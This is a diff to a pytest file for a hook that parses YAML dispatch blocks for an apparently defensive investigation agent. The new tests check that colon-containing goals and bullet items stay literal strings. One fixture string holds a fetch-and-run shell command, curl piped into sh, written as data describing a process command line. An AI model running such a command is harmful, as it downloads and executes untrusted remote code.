@@ -93,13 +93,61 @@ def test_silent_noop_for_non_gather_task(tmp_path, hook, monkeypatch):
     assert hook.main() == 0
 
 
-def test_malformed_yaml_does_not_raise(tmp_path, hook, monkeypatch):
+def test_malformed_dispatch_does_not_raise(tmp_path, hook, monkeypatch):
+    # Pure noise inside the fence — no key lines parse, no sidecar written.
     prompt = (
         "Read defender/skills/gather/SKILL.md and follow it.\n\n"
-        "## Dispatch\n```yaml\nrun_dir: : :\nbroken\n```\n"
+        "## Dispatch\n```yaml\n???\nbroken\n```\n"
     )
     monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
     assert hook.main() == 0
+
+
+def test_goal_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
+    """Reviewer's case: `goal: Compare fields: user and src` must not be
+    interpreted as a nested mapping or silently dropped."""
+    run_dir = tmp_path / "run-colon-goal"
+    (run_dir / "gather_raw").mkdir(parents=True)
+    prompt = (
+        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
+        "## Dispatch\n```yaml\n"
+        f"run_dir: {run_dir}\n"
+        "position: 0\n"
+        "goal: Compare fields: user and src across both leads\n"
+        "what_to_characterize:\n"
+        "  - timing pattern (burst vs scheduled)\n"
+        "```\n"
+    )
+    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
+    assert hook.main() == 0
+    payload = json.loads((run_dir / "gather_raw" / "0.lead.json").read_text())
+    assert payload["goal"] == "Compare fields: user and src across both leads"
+    assert payload["what_to_characterize"] == ["timing pattern (burst vs scheduled)"]
+
+
+def test_dimension_bullet_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
+    """Reviewer's case: `- process cmdline: /bin/sh` must stay a string,
+    not become a `{process cmdline: /bin/sh}` mapping."""
+    run_dir = tmp_path / "run-colon-bullet"
+    (run_dir / "gather_raw").mkdir(parents=True)
+    prompt = (
+        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
+        "## Dispatch\n```yaml\n"
+        f"run_dir: {run_dir}\n"
+        "position: 1\n"
+        "goal: characterize the spawned process tree\n"
+        "what_to_characterize:\n"
+        "  - process cmdline: /bin/sh -c 'curl http://x | sh'\n"
+        "  - parent pid: 4242 vs 4243\n"
+        "```\n"
+    )
+    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
+    assert hook.main() == 0
+    payload = json.loads((run_dir / "gather_raw" / "1.lead.json").read_text())
+    assert payload["what_to_characterize"] == [
+        "process cmdline: /bin/sh -c 'curl http://x | sh'",
+        "parent pid: 4242 vs 4243",
+    ]
 
 
 def test_missing_required_keys_silently_skips_write(tmp_path, hook, monkeypatch):
